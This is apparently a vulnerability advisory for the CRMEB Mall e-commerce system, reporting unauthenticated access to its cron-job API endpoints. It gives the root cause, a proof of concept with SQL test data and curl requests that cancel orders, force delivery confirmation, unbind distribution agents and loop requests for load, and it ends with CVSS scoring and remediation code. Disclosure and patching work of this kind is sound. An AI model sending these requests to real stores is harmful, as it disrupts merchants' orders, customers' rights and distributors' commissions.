# Cron Job Unauthorized Access Vulnerability

**Project**: CRMEB Mall System (CRMEB商城系统)

**Vendor**: CRMEB (https://www.crmeb.com)

**Project Repository**: https://github.com/crmeb/CRMEB.git

**Affected Files**:
- `crmeb/app/api/route/v1.php`
- `crmeb/app/api/controller/v1/CrontabController.php`

**Affected Version**: v5.6.3 and earlier (<= v5.6.3)

**Vulnerability Type**: CWE-862 (Missing Authorization)

**CVSS v3.1 Score**: 9.8 (Critical)

**Discovery Date**: 2025-01-12

---

## Description

All cron job related endpoints lack authentication and authorization controls. Any attacker can invoke these cron job endpoints without authentication, leading to malicious order cancellation, forced delivery confirmation, distribution system disruption, and other serious impacts.

---

## Vulnerability Analysis

### 1. Affected Endpoints

All `/api/crontab/*` endpoints are affected:

- `GET /api/crontab/run` - Execute all enabled cron jobs
- `GET /api/crontab/check` - Update cron job check time
- `GET /api/crontab/order_cancel` - Cancel unpaid orders
- `GET /api/crontab/pink_expiration` - Handle expired group orders
- `GET /api/crontab/agent_unbind` - Auto unbind superior agent
- `GET /api/crontab/live_product_status` - Update live product status
- `GET /api/crontab/live_room_status` - Update live room status
- `GET /api/crontab/take_delivery` - Auto confirm delivery
- `GET /api/crontab/advance_off` - Advance product auto offline
- `GET /api/crontab/product_replay` - Auto positive review
- `GET /api/crontab/clear_poster` - Clear yesterday posters

### 2. Root Cause

**Route Configuration Error**: `crmeb/app/api/route/v1.php:537-539`

```php
})->middleware(\app\http\middleware\AllowOriginMiddleware::class)
    ->middleware(\app\api\middleware\StationOpenMiddleware::class)
    ->middleware(\app\api\middleware\AuthTokenMiddleware::class, false);
    //                                            ^^^^^^ HERE!
```

**Issue**: The second parameter `false` in `AuthTokenMiddleware::class, false` makes authentication middleware **optional**, allowing these endpoints to be accessed without any authentication.

**Cron Job Route Definition**: `crmeb/app/api/route/v1.php:510-535`

```php
Route::group(function () {
    // Cron job endpoints
    Route::get('crontab/run', 'v1.CrontabController/crontabRun')->name('crontabRun')->option(['real_name' => '定时任务调用接口']);
    Route::get('crontab/check', 'v1.CrontabController/crontabCheck')->name('crontabCheck')->option(['real_name' => '检测定时任务接口']);
    Route::get('crontab/order_cancel', 'v1.CrontabController/orderUnpaidCancel')->name('orderUnpaidCancel')->option(['real_name' => '未支付自动取消订单']);
    // ... more cron job routes

})->option(['mark' => 'crontab', 'mark_name' => '定时任务']);
// Note: This route group has no authentication middleware configured separately
```

**Controller Implementation**: `crmeb/app/api/controller/v1/CrontabController.php`

All cron job methods lack permission checks and directly execute business logic:

```php
public function orderUnpaidCancel()
{
    /** @var StoreOrderServices $orderServices */
    $orderServices = app()->make(StoreOrderServices::class);
    $orderServices->orderUnpaidCancel();
    // NO auth check!
}
```

### 3. Comparison with Correct Implementation

Other endpoints that require authentication:

```php
Route::group(function () {
    Route::get('user', 'v1.user.UserController/user');
    Route::post('user/edit', 'v1.user.UserController/edit');
    // ... other authenticated endpoints
})->middleware(\app\api\middleware\AuthTokenMiddleware::class);
//                                              ^^^^^^ NO false parameter
```

---

## Proof of Concept

### Attack Scenario 1: Malicious Order Cancellation

#### Attack Principle

Attackers can invoke the order cancellation endpoint without authentication, causing all eligible (unpaid timeout) orders to be cancelled.

#### Reproduction Steps

**Step 1: Create Test Order**

```sql
-- Insert an unpaid order from 2 hours ago
INSERT INTO eb_store_order (
  order_id, uid, real_name, user_phone, user_address,
  total_num, total_price, pay_price, paid, is_cancel, status,
  pay_type, add_time, is_del, `unique`
) VALUES (
  'TEST_UNPAID_001', 8001, 'Test User', '13800138000', 'Beijing',
  1, 100.00, 100.00, 0, 0, 0,
  'weixin', UNIX_TIMESTAMP() - 7200, 0, MD5('TEST_UNPAID_001')
);
```

**Step 2: Check Order Status Before Attack**

```sql
SELECT order_id, paid, is_cancel, status
FROM eb_store_order
WHERE order_id = 'TEST_UNPAID_001';
```

Result:
```
order_id         | paid | is_cancel | status
-----------------|------|-----------|--------
TEST_UNPAID_001  | 0    | 0         | 0
```

**Step 3: Execute Attack**

```bash
# Attacker invokes endpoint WITHOUT authentication
curl -X GET "http://192.168.176.130:8011/api/crontab/order_cancel"
```

**Step 4: Check Order Status After Attack**

```sql
SELECT order_id, paid, is_cancel, status, mark
FROM eb_store_order
WHERE order_id = 'TEST_UNPAID_001';
```

Result:
```
order_id         | paid | is_cancel | status | mark
-----------------|------|-----------|--------|------------------
TEST_UNPAID_001  | 0    | 1         | 0      | 订单未支付已超过系统预设时间
```

**Attack Successful**: The `is_cancel` field changed from `0` to `1`, order was forcibly cancelled.

### Attack Scenario 2: Forced Delivery Confirmation

```bash
# Create a shipped order (older than auto-delivery days configured)
INSERT INTO eb_store_order (
  order_id, uid, real_name, user_phone, user_address,
  total_num, total_price, pay_price, paid, is_cancel, status,
  pay_type, add_time, is_del, `unique`,
  delivery_type, delivery_id, delivery_name
) VALUES (
  'TEST_SHIPPED_001', 8001, 'Test User', '13800138000', 'Beijing',
  1, 100.00, 100.00, 1, 0, 1,
  'weixin', UNIX_TIMESTAMP() - 604800, 0, MD5('TEST_SHIPPED_001'),
  'express', 'SF123456789', '顺丰快递'
);

# Attacker invokes auto delivery endpoint
curl -X GET "http://192.168.176.130:8011/api/crontab/take_delivery"

# Check order status, status will change from 1 (shipped) to 2 (received)
```

### Attack Scenario 3: Denial of Service

Attackers can invoke cron job endpoints at high frequency, consuming server resources.

```bash
# Simple test: call 10 times continuously
for i in {1..10}; do
  curl -s -X GET "http://192.168.176.130:8011/api/crontab/run" \
    -o /dev/null -w "Request ${i}: HTTP %{http_code}\n"
done
```

Result:
```
Request 1: HTTP 200
Request 2: HTTP 200
Request 3: HTTP 200
Request 4: HTTP 200
Request 5: HTTP 200
Request 6: HTTP 200
Request 7: HTTP 200
Request 8: HTTP 200
Request 9: HTTP 200
Request 10: HTTP 200
```

**All requests succeeded** - attackers can invoke endpoints unlimited times.

### Attack Scenario 4: Distribution System Disruption

```bash
# Attacker invokes unbind endpoint, disrupting distribution relationship chain
curl -X GET "http://192.168.176.130:8011/api/crontab/agent_unbind"
```

**Impact**: May cause accidental unbinding between distributors and subordinates, affecting commission calculations.

---

## Impact

### 1. Order Management Chaos

- **Malicious Order Cancellation**: Attackers can batch cancel user unpaid orders
- **Forced Delivery Confirmation**: Affects user rights for returns and exchanges
- **Group Order Interference**: May affect normal group buying activities

### 2. Distribution System Disruption

- **Unbind Relationships**: Breaks distribution network, affects commission distribution
- **Financial Loss**: Distributors may lose entitled commissions

### 3. Resource Consumption

- **Server Load**: High-frequency invocation consumes server resources
- **Database Pressure**: Massive database queries and updates
- **Business Impact**: May cause service response slowdown

### 4. Data Consistency Issues

- **Inventory Rollback**: Malicious order cancellation may cause inventory confusion
- **Financial Data**: Affects order statistics and financial reports

### 5. Compliance Risk

- **User Complaints**: Orders cancelled maliciously cause complaints
- **Regulatory Risk**: Violates e-commerce regulations

---

## Impact Assessment

### Business Impact

| Impact Type | Severity | Description |
|-------------|----------|-------------|
| Order Security | Critical | Orders can be maliciously cancelled or force delivered |
| Distribution System | High | Superior-subordinate relationships may be maliciously unbound |
| User Experience | High | User orders disrupted causing poor experience |
| System Performance | Medium | Resources maliciously consumed |
| Data Consistency | Medium | May cause data inconsistency |

### Technical Impact

- **No Authentication Required**: Attackers can directly access sensitive endpoints
- **Batch Operations**: Attackers can write scripts to invoke endpoints in batches
- **Hard to Track**: Cannot distinguish between legitimate and malicious calls
- **Wide Scope**: All 11 cron job endpoints are affected

---

## CVSS v3.1 Score

**Base Score**: 9.8 (Critical)

**Vector String**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

**Scoring Details**:
- **Attack Vector (AV)**: Network (N) - Remote network attack
- **Attack Complexity (AC)**: Low (L) - No special skills required
- **Privileges Required (PR)**: None (N) - No authentication required
- **User Interaction (UI)**: None (N) - No user interaction required
- **Scope (S)**: Changed (C) - Affects all users
- **Confidentiality (C)**: High (H) - May leak business data
- **Integrity (I)**: High (H) - Can modify order status
- **Availability (A)**: High (H) - Can cause service unavailability

---

## Remediation

### Immediate Fix (Recommended)

**Option 1: Remove false Parameter**

Modify `crmeb/app/api/route/v1.php:539`:

```php
// Before:
})->middleware(\app\api\middleware\AuthTokenMiddleware::class, false);

// After:
})->middleware(\app\api\middleware\AuthTokenMiddleware::class);
```

**Option 2: Add IP Whitelist Middleware**

Create dedicated cron job IP whitelist middleware:

```php
<?php
namespace app\api\middleware;

class CrontabWhitelistMiddleware
{
    public function handle($request, \Closure $next)
    {
        $allowedIps = ['127.0.0.1', '::1']; // Only allow localhost

        if (!in_array($request->ip(), $allowedIps)) {
            return app('json')->fail('Access denied', 403);
        }

        return $next($request);
    }
}
```

Apply in routes:

```php
Route::group(function () {
    // Cron job routes
})->middleware(\app\api\middleware\CrontabWhitelistMiddleware::class);
```

**Option 3: Use API Key**

Add dedicated cron job API key:

```php
// Set secret key in crontab config
define('CRONTAB_SECRET_KEY', 'your-secret-key-here');

// Verify in controller
public function orderUnpaidCancel(Request $request)
{
    $key = $request->param('key');
    if ($key !== CRONTAB_SECRET_KEY) {
        return app('json')->fail('Unauthorized', 401);
    }

    // Original logic...
}
```

Invoke with key:
```bash
curl "http://target/api/crontab/order_cancel?key=your-secret-key-here"
```

### Long-term Fix

1. **Code Review**: Check all unauthenticated endpoints, ensure all are necessary
2. **Monitoring**: Add monitoring and alerts for cron job invocations
3. **Logging**: Record source and time of all cron job calls
4. **Security Testing**: Regular security testing and penetration testing

### Verify Fix

After fix, unauthenticated requests should return 401:

```bash
curl -X GET "http://192.168.176.130:8011/api/crontab/order_cancel"

# Expected response:
# {"status": 401, "msg": "请先登录"}
```

Only authenticated requests can access:

```bash
curl -X GET "http://192.168.176.130:8011/api/crontab/order_cancel" \
  -H "Authorization: Bearer valid_token"

# Expected response:
# HTTP 200
```

---

## Timeline

- **2025-01-12**: Vulnerability discovered
- **2025-01-12**: Vulnerability reproduction and verification
- **2025-01-12**: Vulnerability report written

---

## References

- OWASP Top 10 2021: A01 Broken Access Control
- CWE-862: Missing Authorization
- CWE-306: Missing Authentication for Critical Function

---

## Credits

Vulnerability discovered and reported by: foeCat
